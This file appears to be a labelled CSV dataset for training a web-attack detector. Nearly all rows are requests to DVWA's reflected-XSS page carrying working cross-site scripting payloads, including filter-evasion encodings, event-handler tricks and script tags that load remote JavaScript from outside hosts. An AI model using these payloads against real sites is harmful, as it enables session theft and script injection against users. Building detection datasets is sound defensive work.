Method,Path,Body,Single Quotes,Double Quotes,Dashes,Braces,Spaces,Tags,Colons,Backtick,Bad Words,XSS Check,XSS Word,Cmdi Word,Cmdi Check,Class
POST,/logging/falco,access_token=936619743392459%7C3cdb3f896252a1db29679cb4554db266&message=%7B%22app_id%22%3A%22936619743392459%22%2C%22app_ver%22%3A%221.0.0%22%2C%22claims%22%3A%5B%220%22%5D%2C%22data%22%3A%5B%7B%22extra%22%3A%7B%22ig_userid%22%3A%220%22%2C%22pk%22%3A%220%22%2C%22rollout_hash%22%3A%221008289988%22%2C%22app_id%22%3A%22936619743392459%22%2C%22frontend_env%22%3A%22C3e%22%2C%22module%22%3A%22unifiedHome%22%2C%22original_referrer%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%2C%22original_referrer_domain%22%3A%22www.google.com%22%2C%22referrer%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%2C%22referrer_domain%22%3A%22www.google.com%22%2C%22url%22%3A%22%2F%22%2C%22nav_chain%22%3A%22PolarisHomeRoot%3AunifiedHome%3A1%3Avia_cold_start%22%2C%22objid%22%3A%22%2F%22%7D%2C%22name%22%3A%22instagram_web_logged_out_impression%22%2C%22time%22%3A1693127517.018%7D%2C%7B%22extra%22%3A%7B%22connectionType%22%3A%22unknown%22%2C%22downlink%22%3A10000%2C%22effectiveType%22%3A%224g%22%2C%22rtt%22%3A250%2C%22objid%22%3A%22%2F%22%2C%22objtype%22%3A%22url%22%7D%2C%22name%22%3A%22instagram_web_client_connection_info%22%2C%22time%22%3A1693127517.326%7D%2C%7B%22extra%22%3A%7B%22event_name%22%3A%22fb_status_received%22%2C%22fbconnect_status%22%3A%22logged_out%22%2C%22frontend_env%22%3A%22C3e%22%2C%22login_identifier_type%22%3Anull%2C%22nav_chain%22%3A%22PolarisHomeRoot%3AunifiedHome%3A1%3Avia_cold_start%22%2C%22path%22%3A%22%2F%22%2C%22platform%22%3A%22desktop%22%2C%22rollout_hash%22%3A%221008289988%22%7D%2C%22name%22%3A%22instagram_web_login%22%2C%22time%22%3A1693127517.929%7D%2C%7B%22extra%22%3A%7B%22event_name%22%3A%22login_form_load%22%2C%22fbconnect_status%22%3A%22logged_out%22%2C%22frontend_env%22%3A%22C3e%22%2C%22login_identifier_type%22%3Anull%2C%22nav_chain%22%3A%22PolarisHomeRoot%3AunifiedHome%3A1%3Avia_cold_start%22%2C%22path%22%3A%22%2F%22%2C%22platform%22%3A%22desktop%22%2C%22rollout_hash%22%3A%221008289988%22%7D%2C%22name%22%3A%22instagram_web_login%22%2C%22time%22%3A1693127518.023%7D%5D%2C%22device_id%22%3A%22670AF480-C17D-4CE4-B18C-09099BCDF649%22%2C%22log_type%22%3A%22client_event%22%2C%22seq%22%3A0%2C%22session_id%22%3A%2218a3643a358-d04026%22%7D,0,0,0,0,0,0,0,0,0,0,0,0,6,good
GET,/DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,,0,0,0,1,0,4,0,0,0,0,1,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%22-prompt(8)-%22,,0,2,0,1,0,0,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name='-prompt(8)-',,2,0,0,1,0,0,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name='-eval(%22window['pro'%2B'mpt'](8)%22)-',,6,2,0,2,0,0,0,0,0,0,0,0,6,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%22-eval(%22window['pro'%2B'mpt'](8)%22)-%22,,4,4,0,2,0,0,0,0,0,0,0,0,6,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%22onclick%3dprompt(8)%3e%22@x%2ey,,0,2,0,1,0,1,0,0,0,0,1,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%22onclick%3dprompt(8)%3e%3csvg%2fonload%3dprompt(8)%3e%22@x%2ey,,0,2,0,2,0,3,0,0,0,0,2,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cimage%2fsrc%2fonerror%3dprompt(8)%3e,,0,0,0,1,0,2,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cimg%2fsrc%2fonerror%3dprompt(8)%3e,,0,0,0,1,0,2,0,0,0,0,1,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cimage%20src%2fonerror%3dprompt(8)%3e,,0,0,0,1,1,2,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cimg%20src%2fonerror%3dprompt(8)%3e,,0,0,0,1,1,2,0,0,0,0,1,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cimage%20src%20%3dq%20onerror%3dprompt(8)%3e,,0,0,0,1,3,2,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cimg%20src%20%3dq%20onerror%3dprompt(8)%3e,,0,0,0,1,3,2,0,0,0,0,1,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3c%2fscrip%3c%2fscript%3et%3e%3cimg%20src%20%3dq%20onerror%3dprompt(8)%3e,,0,0,0,1,3,6,0,0,0,0,2,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3csvg%20onload%3dalert(1)%3e,,0,0,0,1,1,2,0,0,0,0,1,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%22%3e%3csvg%20onload%3dalert(1)%2f%2f,,0,1,0,1,1,2,0,0,0,0,1,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%22onmouseover%3dalert(1)%2f%2f,,0,1,0,1,0,0,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%22autofocus%2fonfocus%3dalert(1)%2f%2f,,0,1,0,1,0,0,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name='-alert(1)-',,2,0,0,1,0,0,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name='-alert(1)%2f%2f,,1,0,0,1,0,0,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%5c'-alert(1)%2f%2f,,1,0,0,1,0,0,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3c%2fscript%3e%3csvg%20onload%3dalert(1)%3e,,0,0,0,1,1,4,0,0,0,0,2,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20contenteditable%20onblur%3dalert(1)%3elose%20focus!%20,,0,0,0,1,4,2,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20onclick%3dalert(1)%3eclick%20this!%20,,0,0,0,1,3,2,0,0,0,0,1,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20oncopy%3dalert(1)%3ecopy%20this!%20,,0,0,0,1,3,2,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20oncontextmenu%3dalert(1)%3eright%20click%20this!%20,,0,0,0,1,4,2,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20oncut%3dalert(1)%3ecopy%20this!%20,,0,0,0,1,3,2,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20ondblclick%3dalert(1)%3edouble%20click%20this!%20,,0,0,0,1,4,2,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20ondrag%3dalert(1)%3edrag%20this!%20,,0,0,0,1,3,2,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20contenteditable%20onfocus%3dalert(1)%3efocus%20this!%20,,0,0,0,1,4,2,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20contenteditable%20oninput%3dalert(1)%3einput%20here!%20,,0,0,0,1,4,2,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20contenteditable%20onkeydown%3dalert(1)%3epress%20any%20key!%20,,0,0,0,1,5,2,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20contenteditable%20onkeypress%3dalert(1)%3epress%20any%20key!%20,,0,0,0,1,5,2,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20contenteditable%20onkeyup%3dalert(1)%3epress%20any%20key!%20,,0,0,0,1,5,2,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20onmousedown%3dalert(1)%3eclick%20this!%20,,0,0,0,1,3,2,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20onmousemove%3dalert(1)%3ehover%20this!%20,,0,0,0,1,3,2,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20onmouseout%3dalert(1)%3ehover%20this!%20,,0,0,0,1,3,2,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20onmouseover%3dalert(1)%3ehover%20this!%20,,0,0,0,1,3,2,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20onmouseup%3dalert(1)%3eclick%20this!%20,,0,0,0,1,3,2,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20contenteditable%20onpaste%3dalert(1)%3epaste%20here!,,0,0,0,1,3,2,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cscript%3ealert(1)%2f%2f%20,,0,0,0,1,1,2,0,0,0,0,1,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cscript%3ealert(1)%3c!...,,0,0,0,1,0,3,0,0,0,0,1,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cscript%20src%3d%2f%2fbrutelogic%2ecom%2ebr%2f1%2ejs%3e%20,,0,0,0,0,2,2,0,0,0,0,1,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cscript%20src%3d%2f%2f3334957647%2f1%3e,,0,0,0,0,1,2,0,0,0,0,1,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3Cx%20onxxx%3dalert(1)%20,,0,0,0,1,2,1,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3c%78%20onxxx%3d1%20,,0,0,0,0,2,1,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20%6Fnxxx%3d1%20,,0,0,0,0,2,1,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20o%6Exxx%3d1%20,,0,0,0,0,2,1,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20on%78xx%3d1%20,,0,0,0,0,2,1,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20onxxx%3D1,,0,0,0,0,1,1,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cX%20onxxx%3d1%20,,0,0,0,0,2,1,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20OnXxx%3d1%20,,0,0,0,0,2,1,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cX%20OnXxx%3d1%20,,0,0,0,0,2,1,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20onxxx%3d1%20onxxx%3d1,,0,0,0,0,2,1,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%2fonxxx%3d1%20,,0,0,0,0,1,1,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%09onxxx%3d1%20,,0,0,0,0,1,1,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%0Aonxxx%3d1%20,,0,0,0,0,1,1,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%0Conxxx%3d1%20,,0,0,0,0,1,1,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%0Donxxx%3d1%20,,0,0,0,0,1,1,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%2Fonxxx%3d1%20,,0,0,0,0,1,1,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%201%3d'1'onxxx%3d1%20,,2,0,0,0,2,1,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%201%3d%221%22onxxx%3d1,,0,2,0,0,1,1,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20%3c%2fonxxx%3d1%20,,0,0,0,0,2,2,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%201%3d%22%3e%22%20onxxx%3d1%20,,0,2,0,0,3,2,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3chttp%3a%2f%2fonxxx%3D1%2f,,0,0,0,0,0,1,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20onxxx%3dalert(1)%201%3d',,1,0,0,1,2,1,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name='onload%3dalert(1)%3e%3csvg%2f1%3d',,2,0,0,1,0,2,0,0,0,0,1,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name='%3ealert(1)%3c%2fscript%3e%3cscript%2f1%3d'%20,,2,0,0,1,1,4,0,0,0,0,1,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%2a%2falert(1)%3c%2fscript%3e%3cscript%3e%2f%2a,,0,0,0,1,0,4,0,0,0,0,1,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%2a%2falert(1)%22%3e'onload%3d%22%2f%2a%3csvg%2f1%3d',,2,2,0,1,0,2,0,0,0,1,1,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%60-alert(1)%22%3e'onload%3d%22%60%3csvg%2f1%3d',,2,2,0,1,0,2,0,2,0,1,1,0,6,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%2a%2f%3c%2fscript%3e'%3ealert(1)%2f%2a%3cscript%2f1%3d',,2,0,0,1,0,4,0,0,0,0,1,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cscript%3ealert(1)%3c%2fscript%3e%20,,0,0,0,1,1,4,0,0,0,0,1,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cscript%20src%3djavascript%3aalert(1)%3e%20,,0,0,0,1,2,2,0,0,0,0,2,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3ciframe%20src%3djavascript%3aalert(1)%3e%20,,0,0,0,1,2,2,0,0,0,0,1,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cembed%20src%3djavascript%3aalert(1)%3e%20,,0,0,0,1,2,2,0,0,0,0,1,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3ca%20href%3djavascript%3aalert(1)%3eclick%20,,0,0,0,1,2,2,0,0,0,0,2,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cmath%3e%3cbrute%20href%3djavascript%3aalert(1)%3eclick%20,,0,0,0,1,2,4,0,0,0,0,1,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cform%20action%3djavascript%3aalert(1)%3e%3cinput%20type%3dsubmit%3e%20,,0,0,0,1,3,4,0,0,0,0,1,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cisindex%20action%3djavascript%3aalert(1)%20type%3dsubmit%20value%3dclick%3e%20,,0,0,0,1,4,2,0,0,0,0,1,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cform%3e%3cbutton%20formaction%3djavascript%3aalert(1)%3eclick%20,,0,0,0,1,2,4,0,0,0,0,1,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cform%3e%3cinput%20formaction%3djavascript%3aalert(1)%20type%3dsubmit%20value%3dclick%3e%20,,0,0,0,1,4,4,0,0,0,0,1,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cform%3e%3cinput%20formaction%3djavascript%3aalert(1)%20type%3dimage%20value%3dclick%3e%20,,0,0,0,1,4,4,0,0,0,0,1,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cform%3e%3cinput%20formaction%3djavascript%3aalert(1)%20type%3dimage%20src%3dSOURCE%3e%20,,0,0,0,1,4,4,0,0,0,0,1,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cisindex%20formaction%3djavascript%3aalert(1)%20type%3dsubmit%20value%3dclick%3e%20,,0,0,0,1,4,2,0,0,0,0,1,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cobject%20data%3djavascript%3aalert(1)%3e%20,,0,0,0,1,2,2,0,0,0,0,1,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3ciframe%20srcdoc%3d%3csvg%2fo%26%23x6Eload%26equals%3balert%26lpar%3b1)%26gt%3b%3e%20,,0,0,0,0,2,3,3,0,0,0,1,0,6,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cmath%3e%3cbrute%20xlink%3ahref%3djavascript%3aalert(1)%3eclick%20,,0,0,0,1,2,4,0,0,0,0,1,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3csvg%3e%3ca%20xmlns%3axlink%3dhttp%3a%2f%2fwww%2ew3%2eorg%2f1999%2fxlink%20xlink%3ahref%3d%3f%3e%3ccircle%20r%3d400%20%2f%3e%3canimate%20attributeName%3dxlink%3ahref%20begin%3d0%20from%3djavascript%3aalert(1)%20to%3d%26%3e,,0,0,0,1,8,8,0,0,0,0,3,0,6,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3chtml%20ontouchstart%3dalert(1)%3e%20,,0,0,0,1,2,2,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3chtml%20ontouchend%3dalert(1)%3e%20,,0,0,0,1,2,2,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3chtml%20ontouchmove%3dalert(1)%3e%20,,0,0,0,1,2,2,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3chtml%20ontouchcancel%3dalert(1)%3e,,0,0,0,1,1,2,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cbody%20onorientationchange%3dalert(1)%3e,,0,0,0,1,1,2,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%22%3e%3cimg%20src%3d1%20onerror%3dalert(1)%3e%2egif,,0,1,0,1,2,3,0,0,0,0,1,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3csvg%20xmlns%3d%22http%3a%2f%2fwww%2ew3%2eorg%2f2000%2fsvg%22%20onload%3d%22alert(document%2edomain)%22%2f%3e,,0,4,0,1,2,2,0,0,0,1,1,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=GIF89a%2f%2a%3csvg%2fonload%3dalert(1)%3e%2a%2f%3dalert(document%2edomain)%2f%2f%3b,,0,0,0,2,0,2,1,0,0,0,1,0,6,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cscript%20src%3d%22data%3a%26comma%3balert(1)%2f%2f,,0,1,0,1,1,1,1,0,0,0,1,0,6,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%22%3e%3cscript%20src%3ddata%3a%26comma%3balert(1)%2f%2f,,0,1,0,1,1,2,1,0,0,0,1,0,6,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cscript%20src%3d%22%2f%2fbrutelogic%2ecom%2ebr%26sol%3b1%2ejs%26num%3b%20,,0,1,0,0,2,1,2,0,0,0,1,0,6,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%22%3e%3cscript%20src%3d%2f%2fbrutelogic%2ecom%2ebr%26sol%3b1%2ejs%26num%3b%20,,0,1,0,0,2,2,2,0,0,0,1,0,6,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3clink%20rel%3dimport%20href%3d%22data%3atext%2fhtml%26comma%3b%26lt%3bscript%26gt%3balert(1)%26lt%3b%26sol%3bscript%26gt%3b%20,,0,1,0,1,3,1,6,0,0,0,1,0,6,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%22%3e%3clink%20rel%3dimport%20href%3ddata%3atext%2fhtml%26comma%3b%26lt%3bscript%26gt%3balert(1)%26lt%3b%26sol%3bscript%26gt%3b,,0,1,0,1,2,2,6,0,0,0,1,0,6,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cbase%20href%3d%2f%2f0%3e,,0,0,0,0,1,2,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cscript%2fsrc%3d%22data%3a%26comma%3beval(atob(location%2ehash%2eslice(1)))%2f%2f%23alert(1),,0,1,0,4,0,1,1,0,0,0,1,0,6,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cbody%20onload%3dalert(1)%3e,,0,0,0,1,1,2,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cbody%20onpageshow%3dalert(1)%3e,,0,0,0,1,1,2,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cbody%20onfocus%3dalert(1)%3e,,0,0,0,1,1,2,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cbody%20onhashchange%3dalert(1)%3e%3ca%20href%3d%23x%3eclick%20this!%23x,,0,0,0,1,3,4,0,0,0,0,1,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cbody%20style%3doverflow%3aauto%3bheight%3a1000px%20onscroll%3dalert(1)%20id%3dx%3e%23x,,0,0,0,1,3,2,1,0,1,0,0,1,6,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cbody%20onscroll%3dalert(1)%3e%3cbr%3e%3cbr%3e%3cbr%3e%3cbr%3e,,0,0,0,1,1,10,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cbr%3e%3cbr%3e%3cbr%3e%3cbr%3e%3cbr%3e%3cbr%3e%3cbr%3e%3cbr%3e%3cbr%3e%3cbr%3e,,0,0,0,0,0,20,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cbr%3e%3cbr%3e%3cbr%3e%3cbr%3e%3cbr%3e%3cbr%3e%3cbr%3e%3cbr%3e%3cbr%3e%3cbr%3e,,0,0,0,0,0,20,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cbr%3e%3cbr%3e%3cbr%3e%3cbr%3e%3cbr%3e%3cbr%3e%3cx%20id%3dx%3e%23x,,0,0,0,0,1,14,0,0,1,0,0,1,6,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cbody%20onresize%3dalert(1)%3epress%20F12!,,0,0,0,1,2,2,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cbody%20onhelp%3dalert(1)%3epress%20F1!%20(MSIE),,0,0,0,2,3,2,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cmarquee%20onstart%3dalert(1)%3e,,0,0,0,1,1,2,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cmarquee%20loop%3d1%20width%3d0%20onfinish%3dalert(1)%3e,,0,0,0,1,3,2,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3caudio%20src%20onloadstart%3dalert(1)%3e,,0,0,0,1,2,2,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cvideo%20onloadstart%3dalert(1)%3e%3csource%3e,,0,0,0,1,1,4,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cinput%20autofocus%20onblur%3dalert(1)%3e,,0,0,0,1,2,2,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3ckeygen%20autofocus%20onfocus%3dalert(1)%3e,,0,0,0,1,2,2,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cform%20onsubmit%3dalert(1)%3e%3cinput%20type%3dsubmit%3e,,0,0,0,1,2,4,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cselect%20onchange%3dalert(1)%3e%3coption%3e1%3coption%3e2,,0,0,0,1,1,6,0,0,1,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=%3cmenu%20id%3dx%20contextmenu%3dx%20onshow%3dalert(1)%3eright%20click%20me!,,0,0,0,1,5,2,0,0,1,0,0,1,6,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=alert%601%60,,0,0,0,0,0,0,0,2,0,0,0,0,6,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=alert%26lpar%3b1%26rpar%3b,,0,0,0,0,0,0,2,0,0,0,0,0,6,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=alert%26%23x28%3b1%26%23x29,,0,0,0,0,0,0,1,0,0,0,0,0,6,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=alert%26%2340%3b1%26%2341,,0,0,0,0,0,0,1,0,0,0,0,0,6,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=(alert)(1),,0,0,0,2,0,0,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=[1]%2efind(alert),,0,0,0,1,0,0,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=top[%22al%22%2b%22ert%22](1),,0,4,0,1,0,0,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=top[%2fal%2f%2esource%2b%2fert%2f%2esource](1),,0,0,0,1,0,0,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=al%5cu0065rt(1),,0,0,0,1,0,0,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=top['al%5c145rt'](1),,2,0,0,1,0,0,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=top['al%5cx65rt'](1),,2,0,0,1,0,0,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=top[8680439%2e%2etoString(30)](1),,0,0,0,2,0,0,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=navigator%2evibrate(500),,0,0,0,1,0,0,0,0,0,0,0,0,0,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=eval(URL%2eslice(-8))%3e%23alert(1),,0,0,0,3,0,1,0,0,0,0,0,0,6,XSS
GET,/DVWA/vulnerabilities/xss_r/?name=eval(location%2ehash%2eslice(1)%3e%23alert(1),,0,0,0,3,0,1,0,0,0,0,0,0,6,XSS
